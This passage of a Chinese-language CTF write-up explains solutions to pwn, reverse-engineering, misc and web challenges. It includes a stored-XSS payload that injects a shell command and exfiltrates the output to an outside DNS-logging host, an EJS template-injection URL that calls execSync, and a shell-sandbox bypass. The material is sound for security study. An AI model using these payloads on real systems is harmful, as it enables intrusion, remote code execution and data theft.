2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>反正就是能看了。当然后面还有个迭代器没成功跑出来，不过能猜到结果了，就没管。</p>
<div class="language-py codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-py codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Unsupported opcode</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> RETURN_GENERATOR</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">encrypt_bytes </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">lambda</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">.0</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">pass</span><span class="token comment" style="color:#999988;font-style:italic"># WARNING: Decompyle incomplete</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">zip</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">key_bytes</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> data_bytes</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="pwn">pwn<a href="#pwn" class="hash-link" aria-label="pwn的直接链接" title="pwn的直接链接">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="not-so-shrimple-is-it--bg">not so shrimple is it / bg<a href="#not-so-shrimple-is-it--bg" class="hash-link" aria-label="not so shrimple is it / bg的直接链接" title="not so shrimple is it / bg的直接链接">​</a></h3>
<p>非常单纯的一个strcpy栈溢出ret2text。唯一问题是写入会被0截断，我们事实上需要覆盖返回libc的6个字节，所以需要分三次写，前两次用结尾的0字节覆盖一个高字节。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="navigator--ez">navigator / ez<a href="#navigator--ez" class="hash-link" aria-label="navigator / ez的直接链接" title="navigator / ez的直接链接">​</a></h3>
<p>程序提供了读写一个数组的一个字节的功能 。栈上整数溢出，atoi没有做负数检查，所以可以向低地址读写。同时写入本身也有数组越界，向高地址也可以写（但读没有越界）。所以整体思路就是用低地址读泄露地址，用高地址写ROP链</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="shellcrunch--ez">shellcrunch / ez<a href="#shellcrunch--ez" class="hash-link" aria-label="shellcrunch / ez的直接链接" title="shellcrunch / ez的直接链接">​</a></h3>
<p>喜闻乐见的手写shellcode题。这次的限制是：首先检查有没有<code>/binsh</code>这几个字符，然后把做一个<code>s[4*n] ^= s[4*n+1]</code>这样的异或操作，相当于自带SMC。最后把<code>s[12*n+2:12*n+6]</code>的字节改成<code>\xf4</code>即<code>hlt</code>。因为有自带SMC，所以很容易绕过字符黑名单。最后<code>hlt</code>用<code>jmp</code>绕过。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="flight-script--nm">flight script / nm<a href="#flight-script--nm" class="hash-link" aria-label="flight script / nm的直接链接" title="flight script / nm的直接链接">​</a></h3>
<p>最新（2.35）堆题，没有PIE，可以增删改，但是每个堆块只能给偏移0处写一个malloc地址，给0x18处写任意8字节（也可以后续修改）。此外同时增加了一个向栈上数组写内容的功能，写入的最大字符数由一个bss的全局变量控制。因此思路是想办法把这个全局变量改大之后打栈溢出。</p>
<p>这个题的0x18偏移很明显对应largebin attack：对于largebin chunk，0x18对应bk_nextsize域。下面代码里，<code>fwd</code>是旧堆块，<code>fwd-&gt;bk_nextsize</code>已经被修改。那么为了保证双链表一致性<code>victim-&gt;bk_nextsize-&gt;fd_nextsize = victim</code>，会导致<code>victim-&gt;bk_nextsize-&gt;fd_nextsize == fwd-&gt;bk_nextsize + 0x20</code>的位置被写入为新的堆块地址。因此<code>fwd-&gt;bk_nextsize</code>应该被改成目标地址-0x20。（注：nextsize双链 表也是以chunk头为元素的，叫这个名字只是因为这个链表是用来做大小排序的）</p>
<blockquote>
<p>根据<a href="https://www.kn0sky.com/?p=398de6d8-9e77-4ac2-a4f6-c6811c2b4c91" target="_blank" rel="noopener noreferrer">这篇博客</a>，目前的保护需要新插入的largebin是链表中最小的。</p>
</blockquote>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">else</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token comment" style="color:#999988;font-style:italic">// nextsize插入节点（双链表中间插入）</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    victim</span><span class="token operator" style="color:#393A34">-&gt;</span><span class="token plain">fd_nextsize </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> fwd</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    victim</span><span class="token operator" style="color:#393A34">-&gt;</span><span class="token plain">bk_nextsize </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> fwd</span><span class="token operator" style="color:#393A34">-&gt;</span><span class="token plain">bk_nextsize</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    fwd</span><span class="token operator" style="color:#393A34">-&gt;</span><span class="token plain">bk_nextsize </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> victim</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    victim</span><span class="token operator" style="color:#393A34">-&gt;</span><span class="token plain">bk_nextsize</span><span class="token operator" style="color:#393A34">-&gt;</span><span class="token plain">fd_nextsize </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> victim</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">  </span><span class="token comment" style="color:#999988;font-style:italic">// 第一个产生任意地址写的地方</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>后面栈溢出很常规了，通过GOT表泄露LIBC再回到main，重走一遍流程。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="strings-only--hd">strings only / hd<a href="#strings-only--hd" class="hash-link" aria-label="strings only / hd的直接链接" title="strings only / hd的直接链接">​</a></h3>
<p>为了ban掉tcache强制用2.25的LIBC。附件的二进制程序似乎有花指令，但是给了源码。也是堆题模板，可以增删改查。</p>
<p>增用的calloc，删的时候悬空指针正确置0了，改的时候也没有越界。另外本题FULL RELRO，没有PIE，初始偏移值为0x200000（而不是0x400000）</p>
<p>目标是改一个栈地址为指定值（泄露地址+任意写）。</p>
<p>主要漏洞：</p>
<ul>
<li>位于main函数的打印分支有格式化字符串漏洞（<code>printf(strings[index])</code></li>
<li>似乎<code>add</code>的过程对数组越界没有检查，可能可以实现<code>sizes</code>改为一个bss地址，使得<code>edit</code>时可以越界。（没用上）</li>
</ul>
<p>泄露地址很简单，关键是怎么任意写。这个题tricky点在于格式化字符串在<code>bss</code>上而不是栈上，所以没法写地址给它用。不过可以注意到<code>%6$p</code>指向<code>strings[index]</code>本身，原本是堆地址，把这个地址改成一个bss地址再对它<code>edit</code>就可以修改任意bss地址。但是如果不能一次改完，再printf这个地址就会报错，所以我们必须用<code>f&quot;%{strings_addr}c%6$n&quot;</code>一次改完（大概输出2MB垃圾数据）。我们选择让它指向另外一个<code>strings</code>数组的地址，把它edit成栈地址，这样我们就可以直接edit那个被修改了的字符串了。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="rev">rev<a href="#rev" class="hash-link" aria-label="rev的直接链接" title="rev的直接链接">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="revioli-revioli-revioli--ez">revioli, revioli, revioli / ez<a href="#revioli-revioli-revioli--ez" class="hash-link" aria-label="revioli, revioli, revioli / ez的直接链接" title="revioli, revioli, revioli / ez的直接链接">​</a></h3>
<p>这个题给的二进制程序会把目标字符串在内存里拼出来，可以gdb下断点之后在内存里搜出来</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="password-protecter--ez">password protecter / ez<a href="#password-protecter--ez" class="hash-link" aria-label="password protecter / ez的直接链接" title="password protecter / ez的直接链接">​</a></h3>
<p>给了一个3.11的pyc，关于pycdc的问题之前讲过了。反编译之后基本就是一个<code>lambda c: chr(ord(c) + 1)</code>加一个循环异或</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="packed-full-of-surprise--ez">Packed Full Of Surprise / ez<a href="#packed-full-of-surprise--ez" class="hash-link" aria-label="Packed Full Of Surprise / ez的直接链接" title="Packed Full Of Surprise / ez的直接链接">​</a></h3>
<p>给了一个加壳的二进制和输出，要求还原输入。我一开始的做法是还原到开始输入时dump内存。从此时的脱壳代码可以找到几个SHA1 magic number，并且从strace可以看出引入了OpenSSL的库。然后我觉得可能这题可能不用强攻，果然每个明文只会影响一个密文，全爆一遍就出来了</p>
<p>结果从flag发现原来这玩意是UPX壳，<code>PCTF{UPX_15_2_3A$y_t0_uNp4cK}</code>，脱壳之后直接可读了，确实是逐个字节加密（流密码？）</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="ai-prng--ez">AI? PRNG / ez<a href="#ai-prng--ez" class="hash-link" aria-label="AI? PRNG / ez的直接链接" title="AI? PRNG / ez的直接链接">​</a></h3>
<p>同样是根据输出还原输入，同样是流密码。过。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="misc">misc<a href="#misc" class="hash-link" aria-label="misc的直接链接" title="misc的直接链接">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="making-baking-pancakes--ez">Making Baking Pancakes / ez<a href="#making-baking-pancakes--ez" class="hash-link" aria-label="Making Baking Pancakes / ez的直接链接" title="Making Baking Pancakes / ez的直接链接">​</a></h3>
<p>按要求编程的题，只是单纯的base64解密而已。评价为pwntools练习题</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="really-only-echo--ez">Really Only Echo / ez<a href="#really-only-echo--ez" class="hash-link" aria-label="Really Only Echo / ez的直接链接" title="Really Only Echo / ez的直接链接">​</a></h3>
<p>绕过一个shell沙盒。基本的检查有两点：排除了<code>$()|&amp;;&lt;&gt;</code>，然后split后不能出现<code>ls /bin</code>（echo除外），至少出现一次echo。</p>
<p>但是没有排除<code>/#</code>和引号，也就意味着<code>/bin/bash -c &quot;cat flag.txt&quot; # echo</code>是合法的命令。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="web">web<a href="#web" class="hash-link" aria-label="web的直接链接" title="web的直接链接">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="giraffe-notes--ez">giraffe notes / ez<a href="#giraffe-notes--ez" class="hash-link" aria-label="giraffe notes / ez的直接链接" title="giraffe notes / ez的直接链接">​</a></h3>
<p>给了php源码，加个XFF头就行了。感觉应该放beginner</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="open-seasame--ez">open seasame / ez<a href="#open-seasame--ez" class="hash-link" aria-label="open seasame / ez的直接链接" title="open seasame / ez的直接链接">​</a></h3>
<p>简单的XSS题。BOT只能访问子网的URL。子网有命令执行权限（也是个简单的shell拼接）的节点需要cookie。但是子网的端口也暴露出来了（没公开，可能是要自己试出来），可以往数据库里存储内容，并且访问时是以<code>text/html</code>的MIME访问的。因此可以构造持久XSS。</p>
<div class="language-html codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-html codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">script</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token script language-javascript function" style="color:#d73a49">fetch</span><span class="token script language-javascript punctuation" style="color:#393A34">(</span><span class="token script language-javascript string" style="color:#e3116c">&quot;/api/cal?modifier=;cat+flag.txt&quot;</span><span class="token script language-javascript punctuation" style="color:#393A34">,</span><span class="token script language-javascript"> </span><span class="token script language-javascript punctuation" style="color:#393A34">{</span><span class="token script language-javascript"></span><br></span><span class="token-line" style="color:#393A34"><span class="token script language-javascript">    </span><span class="token script language-javascript literal-property property" style="color:#36acaa">credentials</span><span class="token script language-javascript operator" style="color:#393A34">:</span><span class="token script language-javascript"> </span><span class="token script language-javascript string" style="color:#e3116c">&quot;include&quot;</span><span class="token script language-javascript punctuation" style="color:#393A34">,</span><span class="token script language-javascript"></span><br></span><span class="token-line" style="color:#393A34"><span class="token script language-javascript"></span><span class="token script language-javascript punctuation" style="color:#393A34">}</span><span class="token script language-javascript punctuation" style="color:#393A34">)</span><span class="token script language-javascript punctuation" style="color:#393A34">.</span><span class="token script language-javascript method function property-access" style="color:#d73a49">then</span><span class="token script language-javascript punctuation" style="color:#393A34">(</span><span class="token script language-javascript punctuation" style="color:#393A34">(</span><span class="token script language-javascript parameter">resp</span><span class="token script language-javascript punctuation" style="color:#393A34">)</span><span class="token script language-javascript arrow operator" style="color:#393A34">=&gt;</span><span class="token script language-javascript punctuation" style="color:#393A34">(</span><span class="token script language-javascript">resp</span><span class="token script language-javascript punctuation" style="color:#393A34">.</span><span class="token script language-javascript method function property-access" style="color:#d73a49">text</span><span class="token script language-javascript punctuation" style="color:#393A34">(</span><span class="token script language-javascript punctuation" style="color:#393A34">)</span><span class="token script language-javascript punctuation" style="color:#393A34">)</span><span class="token script language-javascript punctuation" style="color:#393A34">)</span><span class="token script language-javascript punctuation" style="color:#393A34">.</span><span class="token script language-javascript method function property-access" style="color:#d73a49">then</span><span class="token script language-javascript punctuation" style="color:#393A34">(</span><span class="token script language-javascript punctuation" style="color:#393A34">(</span><span class="token script language-javascript parameter">s</span><span class="token script language-javascript punctuation" style="color:#393A34">)</span><span class="token script language-javascript arrow operator" style="color:#393A34">=&gt;</span><span class="token script language-javascript punctuation" style="color:#393A34">{</span><span class="token script language-javascript"></span><br></span><span class="token-line" style="color:#393A34"><span class="token script language-javascript">    </span><span class="token script language-javascript console class-name">console</span><span class="token script language-javascript punctuation" style="color:#393A34">.</span><span class="token script language-javascript method function property-access" style="color:#d73a49">log</span><span class="token script language-javascript punctuation" style="color:#393A34">(</span><span class="token script language-javascript">s</span><span class="token script language-javascript punctuation" style="color:#393A34">)</span><span class="token script language-javascript punctuation" style="color:#393A34">;</span><span class="token script language-javascript"></span><br></span><span class="token-line" style="color:#393A34"><span class="token script language-javascript">    </span><span class="token script language-javascript keyword" style="color:#00009f">var</span><span class="token script language-javascript"> dnslog </span><span class="token script language-javascript operator" style="color:#393A34">=</span><span class="token script language-javascript"> s</span><span class="token script language-javascript punctuation" style="color:#393A34">.</span><span class="token script language-javascript method function property-access" style="color:#d73a49">slice</span><span class="token script language-javascript punctuation" style="color:#393A34">(</span><span class="token script language-javascript number" style="color:#36acaa">213</span><span class="token script language-javascript punctuation" style="color:#393A34">,</span><span class="token script language-javascript number" style="color:#36acaa">223</span><span class="token script language-javascript punctuation" style="color:#393A34">)</span><span class="token script language-javascript punctuation" style="color:#393A34">.</span><span class="token script language-javascript method function property-access" style="color:#d73a49">split</span><span class="token script language-javascript punctuation" style="color:#393A34">(</span><span class="token script language-javascript string" style="color:#e3116c">&quot;&quot;</span><span class="token script language-javascript punctuation" style="color:#393A34">)</span><span class="token script language-javascript punctuation" style="color:#393A34">.</span><span class="token script language-javascript method function property-access" style="color:#d73a49">map</span><span class="token script language-javascript punctuation" style="color:#393A34">(</span><span class="token script language-javascript parameter">c</span><span class="token script language-javascript arrow operator" style="color:#393A34">=&gt;</span><span class="token script language-javascript">c</span><span class="token script language-javascript punctuation" style="color:#393A34">.</span><span class="token script language-javascript method function property-access" style="color:#d73a49">charCodeAt</span><span class="token script language-javascript punctuation" style="color:#393A34">(</span><span class="token script language-javascript number" style="color:#36acaa">0</span><span class="token script language-javascript punctuation" style="color:#393A34">)</span><span class="token script language-javascript punctuation" style="color:#393A34">.</span><span class="token script language-javascript method function property-access" style="color:#d73a49">toString</span><span class="token script language-javascript punctuation" style="color:#393A34">(</span><span class="token script language-javascript number" style="color:#36acaa">16</span><span class="token script language-javascript punctuation" style="color:#393A34">)</span><span class="token script language-javascript punctuation" style="color:#393A34">)</span><span class="token script language-javascript punctuation" style="color:#393A34">.</span><span class="token script language-javascript method function property-access" style="color:#d73a49">join</span><span class="token script language-javascript punctuation" style="color:#393A34">(</span><span class="token script language-javascript string" style="color:#e3116c">&quot;.&quot;</span><span class="token script language-javascript punctuation" style="color:#393A34">)</span><span class="token script language-javascript punctuation" style="color:#393A34">;</span><span class="token script language-javascript"></span><br></span><span class="token-line" style="color:#393A34"><span class="token script language-javascript">    </span><span class="token script language-javascript function" style="color:#d73a49">fetch</span><span class="token script language-javascript punctuation" style="color:#393A34">(</span><span class="token script language-javascript string" style="color:#e3116c">&quot;http://&quot;</span><span class="token script language-javascript"> </span><span class="token script language-javascript operator" style="color:#393A34">+</span><span class="token script language-javascript"> dnslog </span><span class="token script language-javascript operator" style="color:#393A34">+</span><span class="token script language-javascript"> </span><span class="token script language-javascript string" style="color:#e3116c">&quot;.31f767c0.log.dnslog.biz&quot;</span><span class="token script language-javascript punctuation" style="color:#393A34">,</span><span class="token script language-javascript"> </span><span class="token script language-javascript punctuation" style="color:#393A34">{</span><span class="token script language-javascript"></span><br></span><span class="token-line" style="color:#393A34"><span class="token script language-javascript">        </span><span class="token script language-javascript literal-property property" style="color:#36acaa">mode</span><span class="token script language-javascript operator" style="color:#393A34">:</span><span class="token script language-javascript"> </span><span class="token script language-javascript string" style="color:#e3116c">&quot;no-cors&quot;</span><span class="token script language-javascript"></span><br></span><span class="token-line" style="color:#393A34"><span class="token script language-javascript">    </span><span class="token script language-javascript punctuation" style="color:#393A34">}</span><span class="token script language-javascript punctuation" style="color:#393A34">)</span><span class="token script language-javascript punctuation" style="color:#393A34">;</span><span class="token script language-javascript"></span><br></span><span class="token-line" style="color:#393A34"><span class="token script language-javascript"></span><span class="token script language-javascript punctuation" style="color:#393A34">}</span><span class="token script language-javascript punctuation" style="color:#393A34">)</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">script</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="impersonate--nm">impersonate / nm<a href="#impersonate--nm" class="hash-link" aria-label="impersonate / nm的直接链接" title="impersonate / nm的直接链接">​</a></h3>
<p>出的比较乱的一道题。访问flag的endpoint似乎需要session伪造。这个题flask的secret_key是和服务器启动时间有关的常量，而服务器提供了节点暴露出服务器uptime和current_time。注意考虑小数问题有±1秒误差。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="blob--nm">blob / nm<a href="#blob--nm" class="hash-link" aria-label="blob / nm的直接链接" title="blob / nm的直接链接">​</a></h3>
<p>附件特别短</p>
<div class="language-js codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-js codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">require</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;express&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access" style="color:#d73a49">set</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;view engine&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;ejs&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access" style="color:#d73a49">use</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">(</span><span class="token parameter">req</span><span class="token parameter punctuation" style="color:#393A34">,</span><span class="token parameter"> res</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token arrow operator" style="color:#393A34">=&gt;</span><span class="token plain"> res</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access" style="color:#d73a49">render</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;index&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"> </span><span class="token literal-property property" style="color:#36acaa">blob</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;blob&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token spread operator" style="color:#393A34">...</span><span class="token plain">req</span><span class="token punctuation" style="color:#393A34">.</span><span class="token property-access">query</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access" style="color:#d73a49">listen</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">3000</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>从render调用方式可以判断这个题是有模板的。也没什么思路，就随便搜了搜<code>ejs template injection</code>，结果搜出了express的<a href="https://github.com/mde/ejs/issues/735" target="_blank" rel="noopener noreferrer">issue</a></p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">http://127.0.0.1:3000/?name=John&amp;settings[view options][client]=true&amp;settings[view options][escapeFunction]=1;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;calc&#x27;);</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>但这个洞似乎并不值得给CVE，因为本来就不应该把用户输入可控的<code>req.query</code>直接交给EJS的<code>render</code>。</p>
<p>再强调一遍，永远不要直接写：<code>res.render(&#x27;index&#x27;, req.query)</code></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="dogdays--nm">dogdays / nm<a href="#dogdays--nm" class="hash-link" aria-label="dogdays / nm的直接链接" title="dogdays / nm的直接链接">​</a></h3>
<p>PHP hash绕过，核心是这一句：<code>if(sha1(&quot;TEST SECRET1&quot;.$pic)==$hash){</code></p>
<p>一开始以为是弱类型，但其实1. 现在PHP不能<code>&quot;22ab&quot; == &quot;22&quot;</code>了。2. <code>0e123</code>这种科学计数法要求后面全是数字，概率极低。</p>
<p>到很后面我才发现原来网站给了几个示例的hash。那么就可以直接hash extension attack了。可以用<code>hlextend</code>库</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="domdom--nm">domdom / nm<a href="#domdom--nm" class="hash-link" aria-label="domdom / nm的直接链接" title="domdom / nm的直接链接">​</a></h3>
<p>放最后是因为这题花了最多精力，考验意外的处理能力。</p>
<p>这个题给的路径很清晰：能上传图片，只支持jpg和png扩展名，但会在扩展名后加随机数字。能用PIL读已上传图片的辅助信息返回一个字典（包含<code>image.info.get(&#x27;Comment&#x27;)</code>）。能访问内网，把返回的数据用json解码，取出<code>Comment</code>字段，用lxml，带实体解析解码。所以目标就是上传一个带XXE的Comment的图片。</p>
<p>但是PIL的表现就比较幽默了：</p>
<ul>
<li>jpg, gif, gbr: 确实会读取comment，但是读的是<code>self.info[&#x27;comment&#x27;]</code>全小写的</li>
<li>im: 读的确实是<code>Comment</code>，但是默认Comment会有很多条，会塞到一个list里。最后出来的XML最前面是<code>[</code>，解析失败。</li>
</ul>
<p>最后从官方的<a href="https://pillow.readthedocs.io/en/latest/handbook/image-file-formats.html#iptc-naa" target="_blank" rel="noopener noreferrer">PIL所有支持格式</a>发现，发现EPS作为一个纯文本格式似乎可以指定未定义的Comment字段，于是：</p>
